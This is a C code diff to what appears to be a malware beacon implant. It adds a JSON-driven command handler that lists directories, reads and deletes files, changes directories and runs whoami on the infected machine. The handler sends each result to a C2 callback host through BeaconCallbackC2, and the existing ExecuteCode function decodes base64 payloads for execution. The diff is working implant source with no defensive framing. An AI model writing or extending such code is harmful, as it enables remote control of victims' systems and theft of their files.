@@ -26,6 +26,10 @@
 
 #include "core.h"
 
+// include settings for callbacks
+
+#include "settings.h"
+
 // core functions
 
 BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo)
@@ -428,7 +432,6 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
 BOOL ExecuteCode(char* Base64Buffer, BOOL CodeType)
 {
-    unsigned char shellcode[] = {0};
     size_t out_len   = strlen(Base64Buffer) + 1;
     size_t b64_len   = b64_decoded_size(Base64Buffer);
     char*  b64_out   = (char*)malloc(out_len);
@@ -450,6 +453,64 @@ BOOL ExecuteCode(char* Base64Buffer, BOOL CodeType)
     default:
         return FALSE;
     }
+}
+
+BOOL Stdlib(char* Buffer)
+{
+    char* data;
+    DWORD rOpCode;
+    struct json_object *parsed_json;
+    
+    parsed_json = json_tokener_parse(Buffer);
+    parsed_json = json_object_object_get(parsed_json, "op");
+    int op = json_object_get_int(parsed_json);
+
+    parsed_json = json_tokener_parse(Buffer);
+    parsed_json = json_object_object_get(parsed_json, "args");
+    char* args = json_object_get_string(parsed_json);
+
+    printf("OP: %d\n", op);
+    printf("ARGS: %s\n", args);
+
+    switch (op)
+    {
+
+    case 0x1000:
+        data = listdirs(args);
+        break;
+    
+    case 0x2000:
+        data = readfile(args);
+        break;
+    
+    case 0x3000:
+        data = getdir();
+        break;
+    
+    case 0x4000:
+        data = removefile(args);
+        break;
+    
+    case 0x5000:
+        data = makedirectory(args);
+        break;
+    
+    case 0x6000:
+        data = changedir(args);
+        break;
+    
+    case 0x7000:
+        data = whoami(args);
+        break;
+    
+    default:
+        break;
+    }
+
+    printf("calling back\n");
+    BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &rOpCode, data, DO_CALLBACK, strlen(data));
+    
+    return TRUE;
 }
 
 LPVOID ReportExecutionFail()
